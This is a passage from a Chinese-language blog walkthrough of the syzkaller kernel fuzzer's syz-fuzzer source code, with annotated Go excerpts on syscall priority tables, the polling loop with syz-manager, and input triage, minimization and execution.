weight<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].inout &#123;<br>callWeight.inout = weight<br>&#125;<br>uses[id][c.ID] = callWeight<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Step-II-建立-call-to-call-的权重表"><a href="#Step-II-建立-call-to-call-的权重表" class="headerlink" title="Step.II - 建立 call-to-call 的权重表"></a>Step.II - 建立 call-to-call 的权重表</h5><p>现在我们回到 <code>calcStaticPriorities()</code> 中，在完成了资源使用表 <code>uses</code> 的建立之后，接下来会建立 call-to-call 的权重表 <code>prios</code>：</p><ul><li>遍历资源使用表中的每个权重，基于参数方向赋予静态权重值（例如，当 c0 为创建了一个资源的调用，而 c1 为使用该资源的调用，则一个更高的权重将被赋予）</li><li>调用 <code>normalizePrio()</code> 将表中权重值进行标准化</li><li>对于自我系统调用权重进行单独赋值</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, weights := <span class="hljs-keyword">range</span> uses &#123;<br><span class="hljs-keyword">for</span> _, w0 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">for</span> _, w1 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">if</span> w0.call == w1.call &#123;<br><span class="hljs-comment">// 自身权重在下方赋值.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 静态权重值基于参数方向赋值.当 c0 为创建了一个资源的调用</span><br><span class="hljs-comment">// 而 c1 为使用该资源的调用，则一个更高的权重将被赋予.</span><br>prios[w0.call][w1.call] += w0.inout*w1.in*<span class="hljs-number">3</span>/<span class="hljs-number">2</span> + w0.inout*w1.inout<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-comment">// 自身权重值(call wrt itself) 的赋值应当高些, 但不要太高.</span><br><span class="hljs-keyword">for</span> c0, pp := <span class="hljs-keyword">range</span> prios &#123;<br>pp[c0] = prioHigh * <span class="hljs-number">9</span> / <span class="hljs-number">10</span><br>&#125;<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><p>完成基于资源使用的权重值计算之后静态优先级就算计算完毕了：）</p><h4 id="②-calcDynamicPrio-：动态优先级计算"><a href="#②-calcDynamicPrio-：动态优先级计算" class="headerlink" title="② calcDynamicPrio()：动态优先级计算"></a>② calcDynamicPrio()：动态优先级计算</h4><p>动态优先级的计算基于现有的语料库完成，这一部分的代码比较简单，主要是遍历语料库，对于同时出现的系统调用对 X、Y 的优先级值 <code>+1</code>，完成后调用 <code>normalizePrio()</code> 进行标准化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcDynamicPrio(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> idx0, c0 := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">for</span> _, c1 := <span class="hljs-keyword">range</span> p.Calls[idx0+<span class="hljs-number">1</span>:] &#123;<br>prios[c0.Meta.ID][c1.Meta.ID]++<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="③-normalizePrio-：优先级值标准化"><a href="#③-normalizePrio-：优先级值标准化" class="headerlink" title="③ normalizePrio()：优先级值标准化"></a>③ normalizePrio()：优先级值标准化</h4><p>这个函数逻辑比较简单，主要就是将权重值标准化到 [prioLow..prioHigh] 范围：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>prioLow  = <span class="hljs-number">10</span><br>prioHigh = <span class="hljs-number">1000</span><br>)<br><br><span class="hljs-comment">// normalizePrio 将权重值标准化到 [prioLow..prioHigh] 范围.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">normalizePrio</span><span class="hljs-params">(prios [][]<span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> _, prio := <span class="hljs-keyword">range</span> prios &#123;<br>max := <span class="hljs-type">int32</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> prio &#123;<br><span class="hljs-keyword">if</span> max &lt; p &#123;<br>max = p<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> i, p := <span class="hljs-keyword">range</span> prio &#123;<br>prio[i] = prioLow + p*(prioHigh-prioLow)/max<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="为每个-syz-executor-启动一个协程，正式开始-fuzz"><a href="#为每个-syz-executor-启动一个协程，正式开始-fuzz" class="headerlink" title="为每个 syz-executor 启动一个协程，正式开始 fuzz"></a>为每个 syz-executor 启动一个协程，正式开始 fuzz</h2><p>完成前面的所有准备工作之后，接下来我们终于可以正式开始进行 fuzzing 了，syz-fuzzer 会调用 <code>newProc()</code> 为每个要启动的 syz-executor 创建一个 <code>Proc</code> 实例对象（都存放在 <code>fuzzer.procs</code> 列表中），并<strong>为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作</strong>（<code>proc.Loop()</code>）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br>fuzzer.execOpts.Flags |= ipc.FlagEnableCoverageFilter<br>&#125;<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;starting %v fuzzer processes&quot;</span>, *flagProcs)<br><span class="hljs-keyword">for</span> pid := <span class="hljs-number">0</span>; pid &lt; *flagProcs; pid++ &#123;<br>proc, err := newProc(fuzzer, pid)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create proc: %v&quot;</span>, err)<br>&#125;<br>fuzzer.procs = <span class="hljs-built_in">append</span>(fuzzer.procs, proc)<br><span class="hljs-keyword">go</span> proc.loop()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后主线程调用 <code>pollLoop()</code>，循环等待需要 poll 的情况</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fuzzer.pollLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信"><a href="#0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信" class="headerlink" title="0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信"></a>0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信</h1><p>fuzzing 的工作是由协程 <code>proc.loop()</code> 完成的，在继续深入 fuzzing 过程之前我们先来看看主线程最后还会做些什么：）</p><p>主线程在启动这些协程之后所需要做的工作其实就是响应这些协程的请求，并负责与 syz-manager 间进行 RPC 通信，通过一个不会返回的 <code>pollLoop()</code> 函数完成，该函数核心其实就是一个<strong>无限循环</strong>：</p><ul><li>循环等待 <code>ticker</code> （每 3s 响应一次的计时器）或 <code>fuzzer.needPoll</code> 这两个 channel 之一有数据传来</li><li>如果是  <code>fuzzer.needPoll</code> 传来请求或是距离上次 poll 的时间大于 10s：<ul><li>检查 workQueue 是否需要新的 candidate（candidate 数量少于 executor 数量），若不是且本次请求处理为  <code>fuzzer.needPoll</code> 传来请求，则等到到距离上次 poll 的时间大于 10s</li><li>收集 executor 数据，调用 <code>poll()</code> 通过 RPC 向 syz-manager 获取新的 candidate</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go">unc (fuzzer *Fuzzer) pollLoop() &#123;<br><span class="hljs-keyword">var</span> execTotal <span class="hljs-type">uint64</span><br><span class="hljs-keyword">var</span> lastPoll time.Time<br><span class="hljs-keyword">var</span> lastPrint time.Time<br>ticker := time.NewTicker(<span class="hljs-number">3</span> * time.Second * fuzzer.timeouts.Scale).C<br><span class="hljs-keyword">for</span> &#123;<br>poll := <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ticker:<span class="hljs-comment">/* 3s 一次的计时器 */</span><br><span class="hljs-keyword">case</span> &lt;-fuzzer.needPoll: <span class="hljs-comment">/* fuzzing 协程的 poll 请求 */</span><br>poll = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> fuzzer.outputType != OutputStdout &amp;&amp; time.Since(lastPrint) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">// Keep-alive for manager.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;alive, executed %v&quot;</span>, execTotal)<br>lastPrint = time.Now()<br>&#125;<br><span class="hljs-comment">/* 对于计时器而言至少 10s 才 poll 一次 */</span><br><span class="hljs-keyword">if</span> poll || time.Since(lastPoll) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">/* workqueue 里 work item 数量少于 executor 数量才 poll */</span><br>needCandidates := fuzzer.workQueue.wantCandidates()<br><span class="hljs-keyword">if</span> poll &amp;&amp; !needCandidates &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>stats := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>)<br><span class="hljs-keyword">for</span> _, proc := <span class="hljs-keyword">range</span> fuzzer.procs &#123;<br>stats[<span class="hljs-string">&quot;exec total&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatExecs, <span class="hljs-number">0</span>)<br>stats[<span class="hljs-string">&quot;executor restarts&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatRestarts, <span class="hljs-number">0</span>)<br>&#125;<br><span class="hljs-keyword">for</span> stat := Stat(<span class="hljs-number">0</span>); stat &lt; StatCount; stat++ &#123;<br>v := atomic.SwapUint64(&amp;fuzzer.stats[stat], <span class="hljs-number">0</span>)<br>stats[statNames[stat]] = v<br>execTotal += v<br>&#125;<br><span class="hljs-keyword">if</span> !fuzzer.poll(needCandidates, stats) &#123;<br>lastPoll = time.Now()<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-proc-loop-：真正负责-fuzzing-的核心协程"><a href="#0x04-proc-loop-：真正负责-fuzzing-的核心协程" class="headerlink" title="0x04. proc.loop()：真正负责 fuzzing 的核心协程"></a>0x04. proc.loop()：真正负责 fuzzing 的核心协程</h1><p>下面我们来到 syz-fuzzer 的另一个核心——<strong>真正的 fuzzing 过程</strong>，syz-fuzzer 会为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作（对于 executor 来说相当于督工和不断给任务的上司属于是），该协程对应 <code>proc.loop()</code> 函数，该函数的核心其实还是一个<strong>无限循环</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> loop() &#123;<br>generatePeriod := <span class="hljs-number">100</span><br><span class="hljs-keyword">if</span> proc.fuzzer.config.Flags&amp;ipc.FlagSignal == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 如果我们没有真的覆盖率信号, 更加频繁地生成程序</span><br><span class="hljs-comment">// 因为反馈信号很弱.</span><br>generatePeriod = <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br></code></pre></td></tr></table></figure><h2 id="从全局-WorkQueue-中获取输入，分类处理执行"><a href="#从全局-WorkQueue-中获取输入，分类处理执行" class="headerlink" title="从全局 WorkQueue 中获取输入，分类处理执行"></a>从全局 WorkQueue 中获取输入，分类处理执行</h2><p>大循环的核心逻辑之一为不断地从全局 <code>WorkQueue</code> 中获取新的输入，按照其类型不同调用不同的处理函数，完成后又继续下一轮循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">item := proc.fuzzer.workQueue.dequeue()<br><span class="hljs-keyword">if</span> item != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">switch</span> item := item.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *WorkTriage:<br>proc.triageInput(item)<br><span class="hljs-keyword">case</span> *WorkCandidate:<br>proc.execute(proc.execOpts, item.p, item.flags, StatCandidate)<br><span class="hljs-keyword">case</span> *WorkSmash:<br>proc.smashInput(item)<br><span class="hljs-keyword">default</span>:<br>log.Fatalf(<span class="hljs-string">&quot;unknown work type: %#v&quot;</span>, item)<br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="①-proc-triageInput-：执行输入-amp-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列"><a href="#①-proc-triageInput-：执行输入-amp-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列" class="headerlink" title="① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列"></a>① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列</h3><p>该函数用来处理 WorkQueue 中的 WorkTraige，即<strong>可能会提供新覆盖率的程序</strong>：</p><ul><li>一开始先调用 <code>signalPrio()</code> 检查该输入之前执行结果的 <code>errno</code>，为 <code>0</code> 则 <code>prio |= 1 &lt;&lt; 1</code>，同时还会检查是否 <code>item.p</code> 的 <code>target</code> 不包含 <code>item.p.Calls[call]</code> 对应的调用，若是则 <code>prio |= 1 &lt;&lt; 0</code></li><li>判断是否产生了语料库中没有的新信号，若无则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> triageInput(item *WorkTriage) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: triaging type=%x&quot;</span>, proc.pid, item.flags)<br><br>prio := signalPrio(item.p, &amp;item.info, item.call)<br>inputSignal := signal.FromRaw(item.info.Signal, prio)<br>newSignal := proc.fuzzer.corpusSignalDiff(inputSignal)<br><span class="hljs-keyword">if</span> newSignal.Empty() &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>callName := <span class="hljs-string">&quot;.extra&quot;</span><br>logCallName := <span class="hljs-string">&quot;extra&quot;</span><br><span class="hljs-keyword">if</span> item.call != <span class="hljs-number">-1</span> &#123;<br>callName = item.p.Calls[item.call].Meta.Name<br>logCallName = fmt.Sprintf(<span class="hljs-string">&quot;call #%v %v&quot;</span>, item.call, callName)<br>&#125;<br>log.Logf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;triaging input for %v (new signal=%v)&quot;</span>, logCallName, newSignal.Len())<br></code></pre></td></tr></table></figure><p>完成前面的这些判断工作之后，接下来来到一个会运行三次的小循环：</p><ul><li>调用 <code>proc.executeRaw()</code> <strong>将该输入重新执行一次</strong>，若执行失败（这里的 <code>reexecutionSuccess()</code> 主要检查信号长度是否不为 0）则重新开始循环，失败 2次直接返回</li><li>获取执行所得信号与覆盖率，将覆盖率合并到 <code>inputCover</code> 中，如果 <code>rawCover</code> 为空则还会往里边放一份</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> inputCover cover.Cover<br><span class="hljs-keyword">const</span> (<br>signalRuns       = <span class="hljs-number">3</span><br>minimizeAttempts = <span class="hljs-number">3</span><br>)<br><span class="hljs-comment">// 计算输入覆盖与 non-flaky 信号以最小化.</span><br>notexecuted := <span class="hljs-number">0</span><br>rawCover := []<span class="hljs-type">uint32</span>&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; signalRuns; i++ &#123;<br>info := proc.executeRaw(proc.execOptsCover, item.p, StatTriage)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, item.call) &#123;<br><span class="hljs-comment">// 调用未被执行或失败了.</span><br>notexecuted++<br><span class="hljs-keyword">if</span> notexecuted &gt; signalRuns/<span class="hljs-number">2</span>+<span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-comment">// 发生得太频繁，放弃</span><br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, thisCover := getSignalAndCover(item.p, info, item.call)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rawCover) == <span class="hljs-number">0</span> &amp;&amp; proc.fuzzer.fetchRawCover &#123;<br>rawCover = <span class="hljs-built_in">append</span>([]<span class="hljs-type">uint32</span>&#123;&#125;, thisCover...)<br>&#125;<br>newSignal = newSignal.Intersection(thisSignal)<br><span class="hljs-comment">// 没有 !minimized 检查的情况下 manager 在每次重启后开始丢失相当大量的覆盖率.</span><br><span class="hljs-comment">// Mechanics of this are not completely clear.</span><br><span class="hljs-keyword">if</span> newSignal.Empty() &amp;&amp; item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>inputCover.Merge(thisCover)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里这个 <code>Merge()</code> 其实笔者没太看明白 :（</p><p>目前笔者推测 <code>pc</code> 是 <code>program counter</code> ，这样比较能说得通，不过这样为什么不用 <code>map[uint32]bool</code> 呢？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cov *Cover)</span></span> Merge(raw []<span class="hljs-type">uint32</span>) &#123;<br>c := *cov<br><span class="hljs-keyword">if</span> c == <span class="hljs-literal">nil</span> &#123;<br>c = <span class="hljs-built_in">make</span>(Cover)<br>*cov = c<br>&#125;<br><span class="hljs-keyword">for</span> _, pc := <span class="hljs-keyword">range</span> raw &#123;<br>c[pc] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>循环结束后会检查 item 的标志位，如果未设置 <code>ProgMinimized</code> 说明该输入还未进行最小化，<strong>此时调用</strong> <code>prog.Minimize()</code> <strong>将输入进行最小化</strong></p><p>这里传入的闭包函数主要是一个 <code>minimizeAttempts</code> （3）次的小循环，其中会调用 <code>proc.execute()</code> 执行最小化后的程序，执行失败则返回，若三次循环执行中无法再产生新的信号信号则返回 true，否则返回 false</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br>item.p, item.call = prog.Minimize(item.p, item.call, <span class="hljs-literal">false</span>,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p1 *prog.Prog, call1 <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; minimizeAttempts; i++ &#123;<br>info := proc.execute(proc.execOpts, p1, ProgNormal, StatMinimize)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, call1) &#123;<br><span class="hljs-comment">// The call was not executed or failed.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, _ := getSignalAndCover(p1, info, call1)<br><span class="hljs-keyword">if</span> newSignal.Intersection(thisSignal).Len() == newSignal.Len() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后将这个输入序列化后<strong>发送给 syz-manager 并将其添加到本地语料库中</strong>，如果未设置 <code>ProgSmashed</code> 标志位则再将这个输入放到 WorkSmash 队列中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go">data := item.p.Serialize()<br>sig := hash.Hash(data)<br><br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;added new input for %v to corpus:\n%s&quot;</span>, logCallName, data)<br>proc.fuzzer.sendInputToManager(rpctype.Input&#123;<br>Call:     callName,<br>CallID:   item.call,<br>Prog:     data,<br>Signal:   inputSignal.Serialize(),<br>Cover:    inputCover.Serialize(),<br>RawCover: rawCover,<br>&#125;)<br><br>proc.fuzzer.addInputToCorpus(item.p, inputSignal, sig)<br><br><span class="hljs-keyword">if</span> item.flags&amp;ProgSmashed == <span class="hljs-number">0</span> &#123;<br>proc.fuzzer.workQueue.enqueue(&amp;WorkSmash&#123;item.p, item.call&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-proc-execute-：执行输入，将有意思的输入放到-traige-队列"><a href="#②-proc-execute-：执行输入，将有意思的输入放到-traige-队列" class="headerlink" title="② proc.execute()：执行输入，将有意思的输入放到 traige 队列"></a>② proc.execute()：执行输入，将有意思的输入放到 traige 队列</h3><p>该函数的逻辑比较简单，主要便是调用 <code>proc.executeRaw()</code> 执行传入的输入，并调用 <code>checkNewSignal()</code> 检查执行的结果，将其中有意思的那些放入 traige 队列：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> execute(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) *ipc.ProgInfo &#123;<br>info := proc.executeRaw(execOpts, p, stat)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>calls, extra := proc.fuzzer.checkNewSignal(p, info)<br><span class="hljs-keyword">for</span> _, callIndex := <span class="hljs-keyword">range</span> calls &#123;<br>proc.enqueueCallTriage(p, flags, callIndex, info.Calls[callIndex])<br>&#125;<br><span class="hljs-keyword">if</span> extra &#123;<br>proc.enqueueCallTriage(p, flags, <span class="hljs-number">-1</span>, info.Extra)<br>&#125;<br><span class="hljs-keyword">return</span> info<br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeRaw()</code> 函数的主要逻辑其实就是先检查禁用的系统调用然后是一个伪无限循环调用 <code>proc.env.Exec()</code> 执行输入（好多层套娃），若执行失败则进行错误记录并休眠 1s 后重新进行，执行成功则直接返回</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 